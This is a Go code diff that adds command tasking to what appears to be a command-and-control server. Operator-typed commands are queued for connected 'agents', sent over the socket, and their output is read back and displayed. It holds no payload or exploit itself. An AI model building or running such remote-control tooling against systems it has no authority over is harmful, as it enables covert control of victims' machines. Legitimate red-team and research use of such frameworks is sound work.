@@ -81,6 +81,28 @@ func handleConnection(conn net.Conn) {
 	}
 	agentMu.Unlock()
 
+	for i := range a.Tasks {
+		if a.Tasks[i].Status == "pending" {
+			log.Printf("executing pending task for agent %s: %s", agentID, a.Tasks[i].Command)
+			_, err = conn.Write([]byte(a.Tasks[i].Command + "\n"))
+			if err != nil {
+				log.Printf("failed to send task to agent: %v", err)
+				return
+			}
+			a.Tasks[i].Status = "sent"
+
+			conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+			output, err := reader.ReadString('\n')
+			if err != nil {
+				log.Printf("failed to read task output: %v", err)
+				return
+			}
+			a.Tasks[i].Output = strings.TrimSpace(output)
+			a.Tasks[i].Status = "completed"
+			log.Printf("task output: %s", a.Tasks[i].Output)
+			return
+		}
+	}
 	ackMesg := strings.ToUpper(strings.TrimSpace(message))
 	response := fmt.Sprintf("ACK: %s\n", ackMesg)
 	_, err = conn.Write([]byte(response))
@@ -150,13 +172,21 @@ func interactWithAgent(agentID string) {
 		command, _ := reader.ReadString('\n')
 		command = strings.TrimSpace(command)
 
-		if command == "back" {
+		switch command {
+		case "back":
 			return
+		case "tasks":
+			for _, t := range a.Tasks {
+				fmt.Printf("[%s] %s → %s: %s\n", t.ID[:8], t.Command, t.Status, t.Output)
+			}
+		default:
+			t := task.NewTask(agentID, command)
+			a.Tasks = append(a.Tasks, t)
+			fmt.Printf("[*] task queued: %s (waiting for output...)\n", t.ID)
+			for t.Output == "" {
+				time.Sleep(1 * time.Second)
+			}
+			fmt.Printf("output: %s\n", t.Output)
 		}
-
-		t := task.NewTask(agentID, command)
-		a.Tasks = append(a.Tasks, t)
-		fmt.Printf("Task created with ID: %s\n", t.ID)
-
 	}
 }
